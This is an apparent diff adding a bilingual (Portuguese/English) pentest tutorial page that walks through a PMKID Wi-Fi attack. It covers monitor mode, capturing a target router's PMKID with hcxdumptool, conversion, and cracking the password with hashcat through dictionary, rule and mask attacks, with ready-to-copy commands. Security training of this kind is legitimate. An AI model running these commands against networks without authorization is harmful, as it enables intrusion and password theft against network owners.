@@ -1,0 +1,173 @@
+<!-- TRILHA PMKID — Captura sem cliente -->
+<div class="container-narrow" style="padding-top: var(--space-8); padding-bottom: var(--space-16);">
+
+    <div class="flex items-center gap-3" style="margin-bottom: var(--space-3);">
+        <a href="#/home" class="btn btn-ghost btn-sm"><i class="fa-solid fa-arrow-left"></i> <span data-lang-pt>Voltar</span><span data-lang-en>Back</span></a>
+        <span class="badge badge-advanced"><span data-lang-pt>⭐⭐⭐ Avançado</span><span data-lang-en>⭐⭐⭐ Advanced</span></span>
+    </div>
+    <div style="margin-bottom: var(--space-10);">
+        <h1 style="margin-bottom: var(--space-3);"><i class="fa-solid fa-bolt" style="color: var(--accent-purple);"></i> <span data-lang-pt>Trilha PMKID Capture</span><span data-lang-en>PMKID Capture Trail</span></h1>
+        <p class="text-muted" style="font-size: var(--fs-md); max-width: 650px;">
+            <span data-lang-pt>O ataque PMKID é revolucionário: <strong>não precisa de nenhum cliente conectado</strong>. Capturamos o PMKID diretamente do primeiro frame de associação do roteador. Mais rápido e silencioso que o handshake tradicional.</span>
+            <span data-lang-en>The PMKID attack is revolutionary: <strong>no connected client needed</strong>. We capture PMKID directly from the router's first association frame. Faster and stealthier than traditional handshake.</span>
+        </p>
+        <div style="margin-top: var(--space-4); max-width: 400px;">
+            <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
+                <span class="progress-label text-sm" style="color: var(--accent-purple);">0%</span>
+            </div>
+            <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="pmkid" style="width: 0%; background: var(--accent-purple);"></div></div>
+        </div>
+    </div>
+
+    <!-- Inputs -->
+    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
+        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);"><i class="fa-solid fa-sliders" style="color: var(--accent-purple);"></i> <span data-lang-pt>Configuração</span><span data-lang-en>Setup</span></h3>
+        <div class="form-row">
+            <div class="input-group">
+                <label><span data-lang-pt>Interface</span><span data-lang-en>Interface</span></label>
+                <input type="text" id="iface" value="wlan0" data-cmd-input>
+            </div>
+            <div class="input-group">
+                <label>BSSID (<span data-lang-pt>MAC do Roteador</span><span data-lang-en>Router MAC</span>)</label>
+                <input type="text" id="bssid" value="00:11:22:33:44:55" data-cmd-input>
+            </div>
+        </div>
+        <div class="form-row">
+            <div class="input-group">
+                <label><span data-lang-pt>Canal</span><span data-lang-en>Channel</span></label>
+                <input type="number" id="channel" value="6" min="1" max="14" data-cmd-input>
+            </div>
+            <div class="input-group">
+                <label><span data-lang-pt>Caminho da Wordlist</span><span data-lang-en>Wordlist Path</span></label>
+                <input type="text" id="wordlist" value="/usr/share/wordlists/rockyou.txt" data-cmd-input>
+            </div>
+        </div>
+    </div>
+
+    <!-- FASE 1 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-purple);">Fase 1</div>
+        <h2><i class="fa-solid fa-tower-broadcast"></i> <span data-lang-pt>Modo Monitor</span><span data-lang-en>Monitor Mode</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Ative o modo monitor. O <code>hcxdumptool</code> precisa da interface em modo monitor.</span>
+            <span data-lang-en>Enable monitor mode. <code>hcxdumptool</code> requires the interface in monitor mode.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Comandos</span><span data-lang-en>Commands</span></div>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code>sudo airmon-ng check kill</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="command-box">
+                <code data-cmd="sudo airmon-ng start {iface}">sudo airmon-ng start wlan0</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="1"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Modo monitor ativado</span><span data-lang-en>Monitor mode enabled</span></span></label>
+    </div>
+
+    <!-- FASE 2 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-purple);">Fase 2</div>
+        <h2><i class="fa-solid fa-magnet"></i> <span data-lang-pt>Capturar PMKID com hcxdumptool</span><span data-lang-en>Capture PMKID with hcxdumptool</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>O <code>hcxdumptool</code> envia solicitações de associação ao roteador alvo. Se o roteador suportar PMKID (a maioria dos modernos), ele responde com o PMKID no primeiro frame — <strong>sem precisar de nenhum cliente</strong>.</span>
+            <span data-lang-en><code>hcxdumptool</code> sends association requests to the target router. If the router supports PMKID (most modern ones do), it responds with PMKID in the first frame — <strong>without needing any client</strong>.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-download"></i> <span data-lang-pt>Captura PMKID</span><span data-lang-en>PMKID Capture</span></div>
+            <span class="command-label"><span data-lang-pt>1. Criar arquivo com o MAC alvo (filtro):</span><span data-lang-en>1. Create file with target MAC (filter):</span></span>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code data-cmd="echo '{bssid}' | sed 's/://g' > filterlist.txt">echo '001122334455' | sed 's/://g' > filterlist.txt</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <span class="command-label"><span data-lang-pt>2. Iniciar captura:</span><span data-lang-en>2. Start capture:</span></span>
+            <div class="command-box">
+                <code data-cmd="sudo hcxdumptool -i {ifaceMon} -o capture.pcapng --filterlist_ap=filterlist.txt --filtermode=2 --enable_status=3">sudo hcxdumptool -i wlan0mon -o capture.pcapng --filterlist_ap=filterlist.txt --filtermode=2 --enable_status=3</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="info-box info-success">
+                <i class="fa-solid fa-circle-check"></i>
+                <span><span data-lang-pt>Quando você vir <strong>"FOUND PMKID"</strong> no output, o PMKID foi capturado! Pare com <kbd>Ctrl+C</kbd>. Geralmente leva apenas <strong>1-5 minutos</strong>.</span><span data-lang-en>When you see <strong>"FOUND PMKID"</strong> in the output, PMKID was captured! Stop with <kbd>Ctrl+C</kbd>. Usually takes only <strong>1-5 minutes</strong>.</span></span>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="2"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>PMKID capturado</span><span data-lang-en>PMKID captured</span></span></label>
+    </div>
+
+    <!-- FASE 3 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-purple);">Fase 3</div>
+        <h2><i class="fa-solid fa-arrows-rotate"></i> <span data-lang-pt>Converter para Hashcat</span><span data-lang-en>Convert for Hashcat</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Use <code>hcxpcapngtool</code> para converter o arquivo <code>.pcapng</code> para o formato <code>.hc22000</code> que o Hashcat entende.</span>
+            <span data-lang-en>Use <code>hcxpcapngtool</code> to convert the <code>.pcapng</code> file to the <code>.hc22000</code> format that Hashcat understands.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-file-export"></i> <span data-lang-pt>Conversão</span><span data-lang-en>Conversion</span></div>
+            <div class="command-box">
+                <code>hcxpcapngtool -o hash.hc22000 capture.pcapng</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="info-box info-info">
+                <i class="fa-solid fa-circle-info"></i>
+                <span><span data-lang-pt>O output vai mostrar quantos PMKID e EAPOL pairs foram extraídos. Precisa ter pelo menos 1 PMKID "usable".</span><span data-lang-en>Output will show how many PMKID and EAPOL pairs were extracted. Need at least 1 "usable" PMKID.</span></span>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="3"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Arquivo .hc22000 gerado</span><span data-lang-en>.hc22000 file generated</span></span></label>
+    </div>
+
+    <!-- FASE 4 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-purple);">Fase 4</div>
+        <h2><i class="fa-solid fa-microchip"></i> <span data-lang-pt>Crack com Hashcat (GPU)</span><span data-lang-en>Crack with Hashcat (GPU)</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Agora use o <code>hashcat</code> com a GPU para quebrar o PMKID. O modo <code>-m 22000</code> suporta tanto PMKID quanto handshake EAPOL.</span>
+            <span data-lang-en>Now use <code>hashcat</code> with GPU to crack the PMKID. Mode <code>-m 22000</code> supports both PMKID and EAPOL handshake.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-fire"></i> <span data-lang-pt>Ataque com Dicionário</span><span data-lang-en>Dictionary Attack</span></div>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code data-cmd="hashcat -m 22000 hash.hc22000 {wordlist} -d 1 --force">hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -d 1 --force</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+
+            <div class="action-title"><i class="fa-solid fa-masks-theater"></i> <span data-lang-pt>Ataque com Regras</span><span data-lang-en>Rule-based Attack</span></div>
+            <p class="text-sm text-muted" style="margin-bottom: var(--space-3);">
+                <span data-lang-pt>Regras modificam cada palavra (adicionam números, trocam letras, etc.):</span>
+                <span data-lang-en>Rules modify each word (add numbers, swap letters, etc.):</span>
+            </p>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code data-cmd="hashcat -m 22000 hash.hc22000 {wordlist} -r /usr/share/hashcat/rules/best64.rule --force">hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+
+            <div class="action-title"><i class="fa-solid fa-keyboard"></i> <span data-lang-pt>Brute Force com Máscara</span><span data-lang-en>Mask Brute Force</span></div>
+            <div class="command-box">
+                <code>hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d --force</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+
+            <div class="info-box info-success" style="margin-top: var(--space-4);">
+                <i class="fa-solid fa-rocket"></i>
+                <span><span data-lang-pt><strong>Performance:</strong> Uma RTX 3060 processa ~215.000 chaves/s no modo 22000. Uma RTX 4090 chega a ~1.000.000 k/s!</span><span data-lang-en><strong>Performance:</strong> An RTX 3060 processes ~215,000 keys/s in mode 22000. An RTX 4090 reaches ~1,000,000 k/s!</span></span>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="4"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Senha crackeada com Hashcat</span><span data-lang-en>Password cracked with Hashcat</span></span></label>
+    </div>
+
+    <!-- Completion -->
+    <div class="card-flat reveal" style="text-align: center; padding: var(--space-10);">
+        <i class="fa-solid fa-trophy" style="font-size: 3rem; color: var(--accent-purple); margin-bottom: var(--space-4); display: block;"></i>
+        <h2><span data-lang-pt>Trilha PMKID Completa!</span><span data-lang-en>PMKID Trail Complete!</span></h2>
+        <p class="text-muted" style="margin-top: var(--space-2); margin-bottom: var(--space-6);">
+            <span data-lang-pt>Você dominou o ataque mais moderno de pentest Wi-Fi!</span>
+            <span data-lang-en>You mastered the most modern Wi-Fi pentest attack!</span>
+        </p>
+        <div class="flex justify-center gap-4 flex-wrap">
+            <a href="#/arsenal" class="btn btn-primary"><i class="fa-solid fa-toolbox"></i> Arsenal</a>
+            <a href="#/knowledge" class="btn btn-outline"><i class="fa-solid fa-book"></i> <span data-lang-pt>Teoria</span><span data-lang-en>Theory</span></a>
+            <a href="#/home" class="btn btn-ghost"><i class="fa-solid fa-house"></i> <span data-lang-pt>Início</span><span data-lang-en>Home</span></a>
+        </div>
+    </div>
+</div>
